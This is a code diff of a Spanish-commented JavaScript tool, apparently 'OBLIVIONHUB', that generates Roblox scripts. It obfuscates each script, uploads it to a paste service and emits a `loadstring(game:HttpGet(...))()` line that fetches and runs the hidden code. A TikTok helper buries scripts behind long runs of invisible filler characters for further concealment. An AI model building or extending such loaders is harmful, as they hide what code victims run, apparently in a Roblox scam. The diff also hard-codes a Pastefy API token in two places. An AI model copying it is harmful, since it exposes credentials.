@@ -91,6 +91,7 @@ document.addEventListener('DOMContentLoaded', () => {
     let isAuthenticated = false;
     let userData = null;
     let shortEnabled = false;
+    let selectedShortService = 'oblivion'; // 'pastefy' o 'oblivion'
 
     const savedAuth = localStorage.getItem('oblivion_auth');
     if (savedAuth) {
@@ -104,7 +105,7 @@ document.addEventListener('DOMContentLoaded', () => {
     // ============================================================
     //  CONFIGURACIÓN
     // ============================================================
-    const PASTEFY_API_TOKEN = '7yGnlCgnDuzQVPMjBt90RIiv031jzwA6CMLt7VBYlx5LN4VceDW2EOcHQ7lR';
+    // Ya no necesitamos el token de Pastefy porque usaremos nuestra API
 
     // ============================================================
     //  REFERENCIAS DOM
@@ -120,6 +121,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const modeButtons = document.querySelectorAll('.mode-btn');
     const secondLoadstring = document.getElementById('secondLoadstring');
     const customLoadstring = document.getElementById('customLoadstring');
+    const shortServiceSelect = document.getElementById('shortServiceSelect');
 
     // TikTok Dashboard refs
     const tiktokBtn = document.getElementById('tiktokBtn');
@@ -153,7 +155,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 shortEnabled = false;
             }
             guestLockMessage.classList.remove('hidden');
-            // Si estamos en el dashboard y cerramos sesión, volver a la vista principal
             if (!tiktokDashboard.classList.contains('hidden')) {
                 showMainView();
             }
@@ -226,7 +227,6 @@ document.addEventListener('DOMContentLoaded', () => {
     function showMainView() {
         mainView.style.display = 'block';
         tiktokDashboard.classList.add('hidden');
-        // Limpiar campos del dashboard al salir
         tiktokInput.value = '';
         tiktokOutput.value = '';
         tiktokCopyBtn.textContent = 'COPY';
@@ -240,7 +240,6 @@ document.addEventListener('DOMContentLoaded', () => {
         }
         mainView.style.display = 'none';
         tiktokDashboard.classList.remove('hidden');
-        // Limpiar campos al entrar
         tiktokInput.value = '';
         tiktokOutput.value = '';
         tiktokCopyBtn.textContent = 'COPY';
@@ -259,35 +258,28 @@ document.addEventListener('DOMContentLoaded', () => {
         }
 
         const trimmedScript = script.trim();
-        const longSpacer = 120; // Cantidad de caracteres para la primera línea
+        const longSpacer = 120;
 
-        // Línea 1: muchos ᅠ + espacio + script
         let line1 = SPACE_CHAR.repeat(longSpacer) + ' ' + trimmedScript;
 
-        // Línea 2: mezcla de ᅠ y espacios (simulando el patrón del ejemplo)
         let line2 = '';
         for (let i = 0; i < 60; i++) {
             line2 += SPACE_CHAR.repeat(2) + ' ' + SPACE_CHAR.repeat(1) + ' ';
         }
-        // Ajustar longitud para que sea similar al ejemplo
         line2 = line2.slice(0, 250) + SPACE_CHAR.repeat(40);
 
-        // Línea 3: similar pero con ᅠ y ñ al final
         let line3 = '';
         for (let i = 0; i < 50; i++) {
             line3 += SPACE_CHAR.repeat(2) + ' ' + SPACE_CHAR.repeat(1) + ' ';
         }
         line3 = line3.slice(0, 220) + SPACE_CHAR.repeat(30) + 'ñ';
 
-        // Añadir algunas líneas más con espacios para que sea más parecido
         let line4 = '';
         for (let i = 0; i < 30; i++) {
             line4 += SPACE_CHAR.repeat(3) + ' ' + SPACE_CHAR.repeat(2) + ' ';
         }
         line4 = line4.slice(0, 180) + SPACE_CHAR.repeat(20);
 
-        // Combinar todo (el ejemplo tiene 3 líneas, pero podemos poner 4 para más ofuscación)
-        // En tu ejemplo se ven 3 líneas, así que usaremos 3.
         const result = [
             line1,
             line2,
@@ -301,7 +293,6 @@ document.addEventListener('DOMContentLoaded', () => {
     //  EVENTOS DE NAVEGACIÓN Y TIKTOK
     // ============================================================
     tiktokBtn.addEventListener('click', showDashboardView);
-
     dashboardBackBtn.addEventListener('click', showMainView);
 
     tiktokGenerateBtn.addEventListener('click', () => {
@@ -410,6 +401,17 @@ document.addEventListener('DOMContentLoaded', () => {
         const label = shortToggle.querySelector('.toggle-label');
         label.textContent = shortEnabled ? 'ON' : 'OFF';
     });
+
+    // ============================================================
+    //  SELECTOR DE SERVICIO SHORT
+    // ============================================================
+    if (shortServiceSelect) {
+        shortServiceSelect.addEventListener('change', (e) => {
+            selectedShortService = e.target.value;
+            console.log(`[Short] Servicio cambiado a: ${selectedShortService}`);
+            showNotification(`Short service set to: ${selectedShortService === 'oblivion' ? 'OBLIVIONHUB PRIVATE SHORTENER' : 'Pastefy (public)'}`, 'info');
+        });
+    }
 
     // ============================================================
     //  TODOS LOS BRAINROTS (COMPLETOS)
@@ -786,9 +788,6 @@ document.addEventListener('DOMContentLoaded', () => {
             counterSpan.textContent = `${selectedCount} SELECTED`;
         }
 
-        // ============================================================
-        //  BOTÓN ALL CON ADVERTENCIA IDIOMÁTICA
-        // ============================================================
         const allSelectionWarning = {
             es: "⚠️ Al seleccionar todos los brainrots es muy probable que el script falle y no te llegue invitación. Se recomienda usar el filtro de recomendado y luego buscar los otros faltantes que te puedan servir.",
             en: "⚠️ Selecting all brainrots is very likely to cause the script to fail and you won't receive an invitation. It is recommended to use the recommended filter and then search for the other missing ones that may be useful.",
@@ -890,7 +889,49 @@ document.addEventListener('DOMContentLoaded', () => {
         return obfuscated;
     }
 
-    async function createPastefyPaste(content) {
+    // ------------------------------------------------------------
+    //  NUEVA FUNCIÓN: Guardar en el pastefy INTERNO de OBLIVION
+    // ------------------------------------------------------------
+    async function saveToOblivionPaste(content, title = 'OBLIVION Script') {
+        const url = '/api/paste';  // Tu propio endpoint
+        const payload = {
+            content: content,
+            title: title,
+            public: true,
+            // userId: userData?.id || null  // si quieres asociarlo al usuario
+        };
+
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(payload)
+        });
+
+        if (!response.ok) {
+            const errorText = await response.text();
+            throw new Error(`Oblivion Paste error (${response.status}): ${errorText}`);
+        }
+
+        const result = await response.json();
+        if (!result.success || !result.id) {
+            throw new Error(`Respuesta inválida del paste: ${JSON.stringify(result)}`);
+        }
+
+        // Construir la URL raw (igual que en generate.js)
+        const baseUrl = window.location.origin;
+        const rawUrl = `${baseUrl}/api/paste?id=${result.id}&raw=true`;
+        return rawUrl;
+    }
+
+    // ------------------------------------------------------------
+    //  Función para guardar en Pastefy (público)
+    // ------------------------------------------------------------
+    async function saveToPastefyPublic(content) {
+        // Usamos la API pública de Pastefy (sin token, o con el token que tenías)
+        // Pero ahora usaremos el mismo método que antes (con token)
+        const PASTEFY_API_TOKEN = '7yGnlCgnDuzQVPMjBt90RIiv031jzwA6CMLt7VBYlx5LN4VceDW2EOcHQ7lR';
         const url = 'https://pastefy.app/api/v2/paste';
         const payload = {
             content: content,
@@ -1003,6 +1044,9 @@ end)`;
                 }
             }
 
+            // ============================================================
+            //  SHORT LOADSTRING - USAR SERVICIO SELECCIONADO
+            // ============================================================
             if (shortEnabled) {
                 if (!isAuthenticated) {
                     showNotification('⚠️ Short Loadstring requires Discord authentication. Please sign in.', 'warning');
@@ -1010,10 +1054,24 @@ end)`;
                     generateBtn.disabled = false;
                     return;
                 }
+
                 try {
+                    // 1. Ofuscar el script completo
                     const obfuscatedScript = await obfuscateWithWeAreDevs(fullScript);
-                    const pastefyUrl = await createPastefyPaste(obfuscatedScript);
-                    const finalScript = `loadstring(game:HttpGet("${pastefyUrl}"))()`;
+
+                    // 2. Guardar según servicio seleccionado
+                    let rawUrl;
+                    if (selectedShortService === 'oblivion') {
+                        // Usar nuestro pastefy interno
+                        rawUrl = await saveToOblivionPaste(obfuscatedScript, 'OBLIVION Short Script');
+                        showNotification('✅ Script guardado en OBLIVIONHUB PRIVATE SHORTENER', 'success');
+                    } else {
+                        // Usar Pastefy público
+                        rawUrl = await saveToPastefyPublic(obfuscatedScript);
+                        showNotification('✅ Script guardado en Pastefy (public)', 'success');
+                    }
+
+                    const finalScript = `loadstring(game:HttpGet("${rawUrl}"))()`;
                     outputCode.textContent = finalScript;
 
                 } catch (apiError) {
@@ -1021,6 +1079,7 @@ end)`;
                     outputCode.textContent = fullScript;
                 }
             } else {
+                // Modo normal (sin short)
                 outputCode.textContent = fullScript;
             }
 
